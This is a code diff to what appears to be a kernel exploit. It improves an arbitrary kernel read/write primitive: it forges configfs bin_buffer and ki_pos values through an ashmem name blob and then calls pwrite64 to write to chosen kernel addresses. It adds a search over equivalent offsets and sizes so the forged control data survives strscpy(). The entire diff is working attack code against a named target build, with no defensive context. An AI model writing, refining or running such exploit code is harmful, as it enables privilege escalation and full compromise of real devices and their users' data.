@@ -244,33 +244,72 @@ static int prepare_configfs_read_control(
   return 1;
 }
 
-static int prepare_configfs_write_control(
-    uint64_t target_addr, size_t len,
+/* configfs writes to bin_buffer + ki_pos. The old encoder fixed ki_pos to the
+ * low 24 address bits, but that is only one member of an equivalence class:
+ * adding 2^24 to ki_pos and subtracting it from bin_buffer preserves the exact
+ * destination while changing the bytes that must survive strscpy(). */
+struct configfs_write_plan {
+  uint64_t pos;
+  uint32_t size;
+};
+
+#define CONFIGFS_WRITE_POS_STEP (TARGET_CONFIGFS_ADDR_LOW_MASK + 1ULL)
+#define CONFIGFS_WRITE_SIZE_SLACK 0x200U
+
+static int build_configfs_write_control(
+    uint64_t target_addr, uint64_t pos, uint32_t size,
     unsigned char control[TARGET_CONFIGFS_CONTROL_LEN]) {
-  if (len == 0 || target_addr > UINT64_MAX - (len - 1)) {
-    errno = EOVERFLOW;
-    return 0;
-  }
-  uint64_t low = target_addr & TARGET_CONFIGFS_ADDR_LOW_MASK;
-  uint64_t end = low + len;
-  if ((end >> 31) != 0) {
-    errno = EOVERFLOW;
-    return 0;
-  }
-  uint64_t high = target_addr & ~TARGET_CONFIGFS_ADDR_LOW_MASK;
-  uint32_t end32 = (uint32_t)end;
+  uint64_t bin_buffer = target_addr - pos;
   uint32_t zero = 0;
   memset(control, 1, TARGET_CONFIGFS_CONTROL_LEN);
   memset(control + TARGET_CONFIGFS_WRITE_STATE_OFF, 0,
          TARGET_CONFIGFS_WRITE_ZERO_LEN);
-  memcpy(control + TARGET_CONFIGFS_WRITE_HIGH_OFF, &high, sizeof(high));
-  memcpy(control + TARGET_CONFIGFS_WRITE_END_OFF, &end32, sizeof(end32));
+  memcpy(control + TARGET_CONFIGFS_WRITE_HIGH_OFF, &bin_buffer,
+         sizeof(bin_buffer));
+  memcpy(control + TARGET_CONFIGFS_WRITE_END_OFF, &size, sizeof(size));
   memcpy(control + TARGET_CONFIGFS_WRITE_ZERO_OFF, &zero, sizeof(zero));
-  if (!write_control_survives_strscpy(control)) {
-    errno = EILSEQ;
+  return write_control_survives_strscpy(control);
+}
+
+static int prepare_configfs_write_control(
+    uint64_t target_addr, size_t len, struct configfs_write_plan *plan,
+    unsigned char control[TARGET_CONFIGFS_CONTROL_LEN]) {
+  if (!plan || len == 0 || len > INT32_MAX ||
+      target_addr > UINT64_MAX - (len - 1)) {
+    errno = EOVERFLOW;
     return 0;
   }
-  return 1;
+
+  /* Search every non-negative position congruent to the original low field
+   * that can still fit in configfs_buffer.bin_buffer_size (a signed int in the
+   * ZZI8 binary). The common legacy plan is tried first and remains unchanged.
+   * A small size slack changes otherwise destructive NUL bytes without
+   * changing the bounded copy length. */
+  uint64_t low = target_addr & TARGET_CONFIGFS_ADDR_LOW_MASK;
+  for (uint64_t pos = low; pos <= target_addr;) {
+    uint64_t minimum_size = pos + len;
+    if (minimum_size > INT32_MAX) {
+      break;
+    }
+    for (uint32_t slack = 0; slack <= CONFIGFS_WRITE_SIZE_SLACK; slack++) {
+      uint64_t size = minimum_size + slack;
+      if (size > INT32_MAX) {
+        break;
+      }
+      if (build_configfs_write_control(target_addr, pos, (uint32_t)size,
+                                       control)) {
+        plan->pos = pos;
+        plan->size = (uint32_t)size;
+        return 1;
+      }
+    }
+    if (pos > INT32_MAX - CONFIGFS_WRITE_POS_STEP) {
+      break;
+    }
+    pos += CONFIGFS_WRITE_POS_STEP;
+  }
+  errno = EILSEQ;
+  return 0;
 }
 
 int oss_kernel_read_plan_supported(uint64_t target_addr, size_t len) {
@@ -280,8 +319,9 @@ int oss_kernel_read_plan_supported(uint64_t target_addr, size_t len) {
 }
 
 int oss_kernel_write_plan_supported(uint64_t target_addr, size_t len) {
+  struct configfs_write_plan plan;
   unsigned char control[TARGET_CONFIGFS_CONTROL_LEN];
-  return prepare_configfs_write_control(target_addr, len, control);
+  return prepare_configfs_write_control(target_addr, len, &plan, control);
 }
 
 int oss_kernel_read(int fd, uint64_t target_addr, void *buf, size_t len) {
@@ -322,16 +362,16 @@ int oss_kernel_read(int fd, uint64_t target_addr, void *buf, size_t len) {
 
 int oss_kernel_write(int fd, uint64_t target_addr, const void *buf,
                       size_t len) {
+  struct configfs_write_plan plan;
   unsigned char control[TARGET_CONFIGFS_CONTROL_LEN];
-  if (!buf || !prepare_configfs_write_control(target_addr, len, control)) {
+  if (!buf ||
+      !prepare_configfs_write_control(target_addr, len, &plan, control)) {
     fprintf(stderr,
             "[aar_aaw] unsafe write plan rejected fd=%d addr=%016llx len=%zu "
             "errno=%d(%s)\n",
             fd, (unsigned long long)target_addr, len, errno, strerror(errno));
     return 0;
   }
-  uint64_t low = target_addr & TARGET_CONFIGFS_ADDR_LOW_MASK;
-
   errno = 0;
   if (set_ashmem_name_blob(fd, control, sizeof(control)) != 0) {
     int saved_errno = errno;
@@ -344,7 +384,7 @@ int oss_kernel_write(int fd, uint64_t target_addr, const void *buf,
   }
 
   errno = 0;
-  ssize_t n = pwrite64(fd, buf, len, (off_t)low);
+  ssize_t n = pwrite64(fd, buf, len, (off_t)plan.pos);
   if (n != (ssize_t)len) {
     int saved_errno = errno;
     fprintf(stderr,
